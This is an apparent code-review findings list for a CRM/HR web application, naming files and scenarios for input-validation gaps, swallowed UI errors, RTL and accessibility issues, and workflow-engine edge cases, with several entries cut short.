FILE: super-app/src/app/api/crm/cold-leads/route.ts:48-78 and export/route.ts:50-74
SUM: Cold-leads list/export GET handlers accept unbounded `q`, `industry`, `category`, `location` strings → unbounded ILIKE scans
SCEN: A rep hits GET /api/crm/cold-leads?location=<2MB blob>. The route reads the param directly with no length cap, then issues `where.location = { contains: <2MB>, mode: "insensitive" }`. Postgres ILIKE %<huge>% can't use the trigram index past a certain needle size and falls back to seq-scan of `CrmColdLead`. Global-search/contacts-search already do `.slice(0, 100)` on `q` (see /api/global-search/rou
---
FILE: super-app/src/app/api/crm/admin/audit-log/route.ts:53-62
SUM: Audit-log GET does NOT validate from/to dates (no DATE regex) and accepts unbounded actorId/action/entityId strings
SCEN: A manager hits GET /api/crm/admin/audit-log?from=NOT_A_DATE&action=<10KB>&actorId=<10KB>. Unlike sibling reports (sales-report/export and loss-analytics which both run `DATE_RE.test`), this route does `new Date(`${toParam}T23:59:59.999Z`)` directly — `Invalid Date` propagates into Prisma `gte:`, hitting an opaque 500 or returning every row depending on the driver behaviour. actionFilter / actorId 
---
FILE: super-app/src/app/api/crm/cold-leads/distribute/route.ts:23-26
SUM: Cold-leads distribute accepts unbounded `leadIds` and `repIds` arrays → Promise.all of N updates
SCEN: A manager/admin posts `{ leadIds: <500_000 ids>, repIds: ["r1"] }`. The schema only enforces `min(1)` — no `.max()`. The route then issues `db.crmColdLead.update(...)` once per leadId in a `Promise.all` of 500k promises (route.ts:62-77). This saturates the Prisma pool and ties up a Postgres backend indefinitely. Sibling endpoints DO cap: redistribute caps leadIds at 2000, transfer at 500, bulk at 
---
FILE: super-app/src/lib/hr/validations/payroll.ts:1-33 and overtime.ts:1-39
SUM: Numeric salary/overtime fields accept `z.union([z.number(), z.string()])` with no `.transform()` clamp — `NaN`/Infinity/MAX_VALUE flow into Prisma
SCEN: A privileged user posts /api/hr/payroll/periods with `month: "abc"` or /api/hr/overtime with `hours_requested: 1e500`. The union accepts both; downstream `parseFloat`/`Number` on the string path yields NaN, which Prisma either rejects with a confusing 500 or persists as NULL depending on the column. Compare to the employee.ts:22-25 pattern which uses `.transform(...).pipe(z.number().positive())` c
---
FILE: super-app/src/app/(dashboard)/admin/impersonate/client.tsx:61-93
SUM: Impersonate start() has try/finally with no .catch — admin sees no feedback when network fails
SCEN: Admin selects a user to impersonate and clicks 'Start impersonation'. The try block wraps the fetch but there is no `catch`. On fetch rejection (offline) `setBusy(false)` runs but no toast appears. Admin sees a spinner stop with no change — confusing for a privileged action. Same pattern in account/change-password/client.tsx:38-75: password change with no `.catch` on the fetch — user clicks Update
---
FILE: super-app/src/app/(dashboard)/hr/employees/add/page.tsx:188-202
SUM: Add Employee form discards react-hook-form per-field errors — concatenates server fieldErrors into one toast
SCEN: HR admin submits the Add Employee form with duplicate national_id and missing personal_email format. Server returns `{ fieldErrors: { national_id: ['Already exists'], personal_email: ['Invalid email'] } }`. The onError handler reads Object.entries(data) and JOINS them with ` | ` into a single toast: 'national_id: Already exists | personal_email: Invalid email'. The per-field inputs (which already 
---
FILE: super-app/src/app/(dashboard)/hr/payroll/monthly/page.tsx:132-183
SUM: Multiple payroll mutations swallow server error detail — generic 'Failed to lock payroll' hides the actual cause
SCEN: Accountant clicks 'Lock Month' on a period that already has unapproved overtime or unpaid bonuses. Server returns 409 with `{ error: 'Cannot lock: 3 unapproved OT requests' }`. The mutation's onError is `onError: () => { toast.error('Failed to lock payroll') }` — it discards the err argument entirely. Accountant sees generic message, doesn't know WHY locking failed, scrolls aimlessly. Same pattern
---
FILE: super-app/src/app/(dashboard)/hr/accountant/page.tsx:113-122
SUM: Commissions query swallows fetch errors as `commissionEGP: 0` — accountant may underpay sales reps
SCEN: Accountant opens the payroll/accountant page. The commissions useQuery does `if (!r.ok) return { ... commissionEGP: 0 ... }` (line 117-118) on ANY non-OK response (500, 403, network). The UI silently shows '0 commission' across all reps. Accountant reviews the summary, sees zero, marks payroll as paid for the month — no commissions actually paid even though they were owed.
---
FILE: super-app/src/app/(dashboard)/hr/dashboard/page.tsx:275-303
SUM: Dashboard useQueries never check isError — '0 pending overtime', '0 incidents' rendered when queries fail
SCEN: HR manager loads /hr/dashboard. The metricsQuery, attendanceQuery, incidentsQuery, alertsQuery all read `?? 0` and `?? []` without checking `isError`. If the /metrics endpoint returns 500, the page renders 'Overtime: 0 Pending approval', 'Incidents: 0 Awaiting decision', 'Probation: 0 Ending soon', 'Contracts: 0 Expiring <30d' — looks like a perfectly healthy department.
---
FILE: super-app/src/components/layout/LocaleToggle.tsx:40
SUM: LocaleToggle aria-label is partially hardcoded — 'Switch to <translated>' uses English 'Switch to' even when the page is Arabic.
SCEN: An Arabic-locale screen-reader user focuses the language toggle in the header. The reader announces 'Switch to English' (English) — not the Arabic equivalent. The same component is also used above the public /login form.
---
FILE: super-app/src/components/layout/MobileBottomNav.tsx:139, super-app/src/components/ui/sheet.tsx:56-75
SUM: Mobile bottom-nav 'More' menu always slides in from the physical left, even in RTL Arabic; sheet close button is pinned to physical right with hardcoded English 'Close'.
SCEN: An Arabic-locale user on mobile taps the 'More' button in the bottom nav (line 126-134). The SheetContent at line 139 uses side='left' literally. In sheet.tsx the side variants use physical `left-0` / `right-0` and `border-r` / `border-l` (line 56) — there is no logical-axis variant. So in Arabic (dir='rtl'), the drawer still flies in from the screen-left side instead of the natural-reading-start 
---
FILE: super-app/src/components/crm/opportunities/OpportunityForm.tsx:494-799
SUM: OpportunityForm has many <Label> elements with no htmlFor and matching inputs (Select triggers, Textareas) with no id.
SCEN: Any rep opens /crm/opportunities/new. Labels on lines 494, 530, 547, 560, 579, 598, 614, 625, 630, 749, 768, 782, 799 wrap selects/inputs but lack `htmlFor`; the inputs/selects lack `id`. Examples: line 530 `<Label>{t.forms.priority}</Label>` followed by a Select with no id; line 547 `<Label>{t.forms.estimatedValue} *</Label>` followed by `<Input … />` with no id. The same pattern exists in Compan
---
FILE: super-app/src/components/crm/opportunities/OpportunityListClient.tsx:197-218
SUM: Saved-view dialog and bulk-transfer flow use hardcoded English in confirm(), toasts, and dialog copy.
SCEN: A manager on /crm/opportunities (Arabic locale) clicks the saved-view menu. Strings hardcoded English: line 197 `toast.error('Couldn't save view')`, line 200 `toast.success(\`View "${name}" saved\`)`, line 211 `confirm('Delete this saved view?')`, line 214 `toast.success('View deleted')`, line 218 `toast.error('Delete failed')`. Same file lines 249-256: bulk-transfer failure/success toasts includi
---
===== LOW (12) =====
FILE: super-app/src/app/api/notifications/read/route.ts:27-58
SUM: Bulk mark-all-read does not enforce module entitlement
SCEN: Client sends `{ scope: 'all' }` with no module. The handler at lines 29-55 issues `updateMany` against HR, Partners, AND CRM tables. Each updateMany is filtered by `userId`, so it's a no-op if the user has no rows in those tables. Functionally safe today. But if `{ scope: 'all', module: 'hr' }` is sent by a CRM-only user (no `hr` in their modules), nothing rejects the request — lines 31-37 still r
---
FILE: super-app/src/components/layout/NotificationCenter.tsx:124-145
SUM: Optimistic mark-read can mark an unrelated module's notification when ids happen to collide
SCEN: Optimistic update on line 128 uses `x.id === n.id` as the predicate, without checking `x.module`. cuids are not guaranteed unique across separate tables — CrmNotification, HrNotification, PartnerNotification each have independently-generated cuids. A near-zero but non-zero probability of collision exists. If it ever happens, clicking an HR notification optimistically marks a CRM notification read 
---
FILE: super-app/src/app/(dashboard)/crm/admin/dashboards/client.tsx:321-331
SUM: Dead UI branch — the admin table loads with `mineOnly=1` so `d.mine` is always true, making the `read-only` else branch unreachable.
SCEN: `load()` calls `/api/crm/dashboards?mineOnly=1` (line 130) which only returns rows where `ownerId === caller`. Each returned `d.mine === true` (route.ts:123). The table row at client.tsx:322-331 has a `d.mine ? <edit buttons> : <span>read-only</span>` ternary. The else branch can never fire.
---
FILE: super-app/src/app/api/crm/dashboards/route.ts:275-280
SUM: PATCH unconditionally fires `crmDashboardShare.deleteMany` on every non-SPECIFIC PATCH even when no visibility change and there are no shares to delete.
SCEN: Owner of an EVERYONE dashboard PATCHes only `{ id, name: 'New name' }`. finalVisibility stays 'EVERYONE'. Branch at line 275-280 fires `deleteMany({ where: { dashboardId: id } })`. There are no shares for an EVERYONE dashboard so the delete is a no-op — but it's an unnecessary write in the transaction on every rename, which means every name-edit takes a row-level lock on the share table.
---
FILE: super-app/src/components/crm/dashboard/CustomDashboardTabs.tsx:117-141
SUM: Initial active-tab state is hard-coded to '__my-day' with no persistence; if a recipient bookmarks/refreshes a shared dashboard, they're bounced back to 'My Day'.
SCEN: Recipient opens /crm/my, clicks a shared dashboard tab (URL doesn't change — tabs aren't router-backed). They refresh the page or share the URL. On reload, `active` state initialises to '__my-day' (line 117). The user is silently dumped back to the legacy view, even though the URL was the same.
---
FILE: super-app/src/app/api/crm/meetings/route.ts:63-74
SUM: from/to date validation only checks `!Number.isNaN(new Date(s).getTime())` — accepts loose formats that drift the filter window
SCEN: Caller passes `?from=2026` — `new Date('2026')` returns Jan 1 2026 UTC, isValidDateString returns true, the filter is applied as gte=Jan 1 2026 instead of erroring. Similarly `?from=2026-2` → Feb 1 2026 silently. Compared to the daily-reports route which enforces YYYY-MM-DD via regex (route.ts:46-58), the meetings route accepts whatever JS Date.parse tolerates.
---
FILE: super-app/src/lib/crm/workflows/engine.ts:194-224
SUM: set-field whitelist allows `leadSource` (free text) but UI's enum/text type is text — minor consistency, not a bug — however the whitelist is missing `techRequirements` that the engine accepts but the UI never offers.
SCEN: Whitelist exposes techRequirements (CrmOpportunity column at schema:2754) but SET_FIELD_OPTIONS in the client lacks it. Net effect: no functional bug, just a quietly unreachable engine capability. Mirror of the stage discrepancy in the opposite direction.
---
FILE: super-app/src/components/crm/shared/ClauseBuilder.tsx:231-243
SUM: ClauseBuilder round-trip drops legacy single-clause structure into an array but does not preserve a `notNull` empty value distinction — an `exists` clause's value is forced to null, then on save it round-trips as `{op:'exists', value:null}` which the engine treats correctly, but a `contains` clause whose admin-entered value is empty string is preserved as '' (not null) and `evalPredicate` returns false silently.
SCEN: Admin edits a workflow with a `contains` clause, clears the value field. Builder stores value=''. Saved as `{field:'description', op:'contains', value:''}`. Engine line 145: `typeof left === 'string' && typeof right === 'string' && left.includes(right)` — `''.includes('')` is true; any string includes '' is true. So an empty contains clause silently matches every event. Not what the admin intended
---
FILE: super-app/src/lib/crm/workflows/engine.ts:115-118
SUM: evalPredicate treats `pred == null` as 'always match' (returns true), so a workflow whose triggerConfig was stored as JSON null via the API will fire on every event of that triggerKind even if the admin intended a filter.
SCEN: Admin via /api/crm/admin/workflows POST sends `triggerConfig: null` (or PATCH later sets it to null at the DB level). On fireWorkflow, `wf.triggerConfig` is null, the ternary at line 283-285 takes the `: true` branch (because `null` is falsy), or if the value is present-but-null-payload, evalPredicate returns true. Either way: no filter. The 'safe default' is 'fire'.
---
FILE: super-app/src/app/(dashboard)/crm/admin/workflows/client.tsx:269-303 (no testFire) + engine.ts:55
SUM: FireOptions.ignoreSuppression is exposed in the engine for an admin 'test fire' button, but the admin UI never renders one — there is no way to dry-run a workflow without waiting for a real event.
SCEN: Admin builds a complex notify-in-app workflow and wants to verify it. Code search confirms no /api endpoint and no client button invokes fireWorkflow with ignoreSuppression:true; the only callers (actions.ts:361, actions.ts:798, pipeline/route.ts:237, cold-leads/.../disposition/route.ts:90) all use the production default. The engine's documented affordance is unused.
---
FILE: super-app/src/lib/auth.ts:285-433
SUM: JWT refresh failure with no prior token.modules silently delivers a session with modules=[] instead of failing closed
SCEN: Fresh sign-in where dbUser lookup at line 406-432 fails due to a Neon blip. The catch at line 426-432 returns null. The check at line 433 `if (!dbUser && shouldRefresh) { if (token.modules) return token; }` -- since this is a fresh sign-in token.modules is undefined, so we do NOT return early. Code falls through to `if (dbUser)` (false) and returns the bare token. Session callback at line 540 sets
---
FILE: super-app/src/components/layout/Sidebar.tsx:420-444, super-app/src/components/layout/ModuleSwitcher.tsx:98-107
SUM: Sidebar collapse button has no aria-label, uses physical ChevronLeft/Right that don't reflect logical RTL direction, and ModuleSwitcher dropdown opens with hardcoded `left-full ml-2` in collapsed state.
SCEN: Sidebar.tsx line 439-444 is an icon-only <button> with no aria-label and no sr-only text — just title={undefined or label}. The CollapseIcon flips by `collapsed`, not by `dir`, so in RTL the chevron direction is wrong relative to where the sidebar lives. Also line 425 uses `border-r` (physical right) instead of `border-e` — in RTL the sidebar should have the border on its logical end. ModuleSwitch
---